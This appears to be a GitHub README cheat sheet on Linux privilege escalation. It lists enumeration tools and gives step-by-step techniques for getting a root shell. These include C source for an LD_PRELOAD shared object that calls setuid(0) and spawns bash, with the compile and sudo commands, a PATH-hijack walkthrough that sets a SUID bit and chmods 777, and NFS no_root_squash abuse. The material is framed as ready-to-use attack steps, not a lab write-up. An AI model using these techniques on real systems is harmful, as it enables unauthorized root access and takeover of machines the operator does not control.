# Privilege-Escalation
Bypass security restrictions in misconfigured systems.
List of Tools and Repositories 👇🏻

## For Linux

***LinPeas*** - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

***LinEnum*** - https://github.com/rebootuser/LinEnum

***LES (Linux Exploit Suggester)*** - https://github.com/mzet-/linux-exploit-suggester

***Linux Smart Enumeration*** - https://github.com/diego-treitos/linux-smart-enumeration

***Linux Priv Checker*** - https://github.com/linted/linuxprivchecker 

***GTFOBins*** - https://gtfobins.github.io/ ⭐

***To list all the files which have SUID and SGID bits set***
```
find / -type f -perm -04000 -ls 2>/dev/null
```

###### ***Using LD_Preload***
> This piece of code will spawn root shell ➡️ [shell.c](https://github.com/Somchandra17/Privilege-Escalation/blob/01f889492ff51414fa077a01fa538ecd5a0d4543/shell.c)
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
> Compile it using GCC into a Shared Object file(.so)
```
gcc -fPIC -shared -o shell.so shell.c -nostartfile
```
> Run it by using LD_Preload option  
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```
***Linux Privilege Escalation exploiting Sudo Rights — Part I*** - https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d

***Abusing 'find', 'vim' and 'awk' for root access*** - https://www.andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/

###### ***Through Capabilities***
> List all enabled Capabilities
```
getcap -r / 2>/dev/null
```
> If you find any set capabilities then use GTFOBins and search your Binary name - https://gtfobins.github.io/#+capabilities

###### ***Cron job configurations***
> Anyone can read the file cron jobs under 👇🏻
```
/etc/crontab
```
###### ***Using $PATH***
> list the PATH by ``echo $PATH``

> find for writable path ``find / -writable 2>/dev/null`` or clean the out put using -> `` find / -writable 2>/dev/null | cut -d "/" -f2 | sort -u ``

> If able to modify the $PATH then ``export PATH=/DIR:$PATH`` (make sure to change the DIR)

now we have the required directory listed in out $PATH then we can just create a Script to exploit it 

For example 👉🏻 [path.c](path.c).
Now compile it using gcc ``gcc path.c -o shell``. OR you can also use python3 file [path.py](path.py) just run it as executable not as python3 file.py

After compiling set the SUID bit ``chmod u+s shell``

Now, go into the directory whichever you have added to $PATH and create a executable file ``echo "/bin/bash" > tobeX ``
give it executable rights ``chmod 777 tobeX ``

Final Step ->  Just run script that we have created  ``./shell``. Boom!

###### ***Network File Share***
> The list of all the fielsystems which may be exported is present in `/etc/exports`.


> Check for `no_root_squash`.

> By using `showmount` you can see the mountable shares in your attack machine. 


> Then just mount the shared to your attack machine by 👉🏻 `mount -o rw {ip of target}:{mountable dir} /{dir of ur attack machine}`


> Just create a executable with SUID bit set in that folder which can run /bin/bash on the target system check this * for example 


> Just compile it and run it from the target system.
